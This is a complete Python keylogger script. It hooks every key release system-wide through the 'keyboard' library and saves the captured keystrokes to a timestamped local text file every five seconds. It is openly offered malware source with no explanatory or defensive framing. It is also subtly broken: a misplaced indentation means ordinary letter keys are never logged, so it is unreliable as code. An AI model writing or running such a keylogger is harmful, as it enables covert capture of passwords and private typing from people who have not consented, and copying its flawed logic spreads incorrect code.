from typing import Any
import keyboard
from threading import Timer
from datetime import datetime

SEND = 5

class KeyLogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

            self.log += name

    def update_file(self):
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "_").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "_").replace(":", "")
        self.filename = f"Keylog-{start_dt_str}_{end_dt_str}"

    def report_file(self):
        with open(f"{self.filename}.txt", "w") as f:
            f.write(self.log)
        print(f"Saved {self.filename}.txt")

    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.update_file()
            self.report_file()
            self.start_dt = datetime.now()

        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()

if __name__ == "__main__":
    KeyLogger(interval=SEND).start()
